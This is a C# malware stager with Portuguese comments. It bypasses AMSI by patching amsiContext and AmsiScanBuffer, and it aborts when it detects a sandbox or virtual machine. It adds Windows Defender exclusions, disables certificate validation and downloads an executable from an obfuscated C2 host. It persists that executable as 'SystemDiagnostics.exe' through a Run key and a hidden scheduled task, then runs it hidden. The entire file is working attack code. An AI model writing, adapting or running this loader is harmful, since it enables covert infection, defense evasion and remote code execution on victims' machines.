using System;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net.Security;

class Stager
{
    static string LogFile;
    static string ExeDir;

    static void Log(string msg)
    {
        string line = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " " + msg;
        Console.WriteLine(line);
        try { File.AppendAllText(LogFile, line + Environment.NewLine); } catch { }
    }

    // AMSI bypass via amsiContext patching (técnica atualizada Dez 2025)
    static void BypassAmsi()
    {
        try
        {
            // Técnica 1: amsiContext null-write (menos detectável que amsiInitFailed)
            var amsiType = Type.GetType("System.Management.Automation.AmsiUtils, System.Management.Automation");
            if (amsiType != null)
            {
                var field = amsiType.GetField("s_amsiContext", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
                if (field != null)
                {
                    var ctx = field.GetValue(null);
                    if (ctx != null)
                    {
                        Marshal.WriteInt64(ctx, 8, 0);
                        Log("AMSI bypass (amsiContext) OK");
                        return;
                    }
                }
            }

            // Fallback: AmsiScanBuffer patch
            IntPtr amsi = GetModuleHandle("amsi.dll");
            if (amsi != IntPtr.Zero)
            {
                IntPtr asb = GetProcAddress(amsi, "AmsiScanBuffer");
                if (asb != IntPtr.Zero)
                {
                    byte[] patch = IntPtr.Size == 8
                        ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }
                        : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
                    uint oldProtect;
                    VirtualProtect(asb, (UIntPtr)patch.Length, 0x40, out oldProtect);
                    Marshal.Copy(patch, 0, asb, patch.Length);
                    VirtualProtect(asb, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                    Log("AMSI bypass (AmsiScanBuffer) OK");
                }
            }
        }
        catch { Log("AMSI bypass falhou"); }
    }

    // Anti-sandbox avançado
    static bool DetectSandbox()
    {
        // RAM < 3.8GB
        try
        {
            var cs = new System.Management.ManagementObject("Win32_ComputerSystem");
            ulong ram = (ulong)cs["TotalPhysicalMemory"];
            if (ram < 3800000000) return true;
        }
        catch { }

        // Disco < 60GB
        try
        {
            var disk = new System.Management.ManagementObject("Win32_LogicalDisk.DeviceID='C:'");
            ulong size = (ulong)disk["Size"];
            if (size < 60000000000) return true;
        }
        catch { }

        // Processos < 40
        if (Process.GetProcesses().Length < 40) return true;

        // Uptime < 10 minutos
        try
        {
            var os = new System.Management.ManagementObject("Win32_OperatingSystem");
            DateTime lastBoot = DateTime.ParseExact(
                os["LastBootUpTime"].ToString().Substring(0, 14),
                "yyyyMMddHHmmss",
                System.Globalization.CultureInfo.InvariantCulture);
            if ((DateTime.Now - lastBoot).TotalMinutes < 10) return true;
        }
        catch { }

        // VM artifacts
        try
        {
            string[] vmProcesses = { "vmtoolsd", "VBoxService", "VBoxTray", "vmwaretray" };
            foreach (var proc in Process.GetProcessesByName(""))
            {
                foreach (string vm in vmProcesses)
                {
                    if (proc.ProcessName.ToLower().Contains(vm)) return true;
                }
            }
        }
        catch { }

        // Registry artifacts
        try
        {
            string[] vmKeys = {
                @"SOFTWARE\VMware, Inc.\VMware Tools",
                @"SOFTWARE\Oracle\VirtualBox Guest Additions"
            };
            foreach (string keyPath in vmKeys)
            {
                if (Microsoft.Win32.Registry.LocalMachine.OpenSubKey(keyPath) != null) return true;
            }
        }
        catch { }

        return false;
    }

    static void AddDefenderExclusion(string path)
    {
        try
        {
            var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Exclusions\Paths");
            if (key != null) { key.SetValue(path, 0, Microsoft.Win32.RegistryValueKind.DWord); key.Close(); }
            Log("Exclusion: " + path);
        }
        catch { }
    }

    static void AddDefenderProcessExclusion(string process)
    {
        try
        {
            var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Exclusions\Processes");
            if (key != null) { key.SetValue(process, 0, Microsoft.Win32.RegistryValueKind.DWord); key.Close(); }
            Log("Process exclusion: " + process);
        }
        catch { }
    }

    static void AddRunKey(string exePath)
    {
        try
        {
            var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Run", true);
            if (key != null) { key.SetValue("SystemHelper", "\"" + exePath + "\""); key.Close(); }
            Log("Run key: " + exePath);
        }
        catch { }
    }

    static void AddScheduledTaskPs(string exePath)
    {
        try
        {
            string ps = string.Format(
                "$a=New-ScheduledTaskAction -Execute '{0}';" +
                "$t=New-ScheduledTaskTrigger -AtLogOn -User $Env:UserName;" +
                "$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;" +
                "Register-ScheduledTask -TaskName 'SystemHelper' -Action $a -Trigger $t -Settings $s -Force",
                exePath.Replace("'", "''"));
            Process.Start(new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoP -NonI -W H -EP Bypass -Command \"" + ps + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });
            Log("Scheduled task: " + exePath);
        }
        catch (Exception ex) { Log("Scheduled task ERRO: " + ex.Message); }
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string name);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint newProtect, out uint oldProtect);

    static void Main()
    {
        ExeDir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
        LogFile = Path.Combine(ExeDir, "stager.log");

        Log("=== STAGER v3 INICIADO ===");
        Log("Dir: " + ExeDir);

        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;
        ServicePointManager.ServerCertificateValidationCallback = (s, cert, chain, errors) => true;

        // Anti-sandbox
        if (DetectSandbox())
        {
            Log("SANDBOX DETECTADO — abortando");
            return;
        }

        BypassAmsi();

        string dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "Microsoft", "Windows", "Caches");
        Directory.CreateDirectory(dir);
        string exePath = Path.Combine(dir, "SystemDiagnostics.exe");
        Log("Destino: " + exePath);

        AddDefenderExclusion(dir);
        AddDefenderExclusion(exePath);
        AddDefenderProcessExclusion("SystemDiagnostics.exe");
        AddDefenderProcessExclusion(exePath);

        string url = "https://" + "c2" + "." + "convert1ri" + ".com" + "/down" + "load/System" + "Diagnostics.exe";
        Log("Download: " + url);

        try
        {
            Log("Baixando...");
            WebClient wc = new WebClient();
            wc.Headers.Add("User-Agent", "Mozilla/5.0");
            byte[] data = wc.DownloadData(url);
            Log("Download OK: " + data.Length + " bytes");

            if (data.Length > 10000 && data[0] == 0x4D && data[1] == 0x5A)
            {
                File.WriteAllBytes(exePath, data);
                Log("Salvo: " + exePath);

                AddRunKey(exePath);
                AddScheduledTaskPs(exePath);

                Log("Executando...");
                Process.Start(new ProcessStartInfo(exePath)
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                });
                Log("Loader executado!");
            }
            else
            {
                Log("ERRO: Arquivo invalido");
            }
        }
        catch (Exception ex)
        {
            Log("ERRO: " + ex.Message);
        }

        Log("=== STAGER FINALIZADO ===");
    }
}
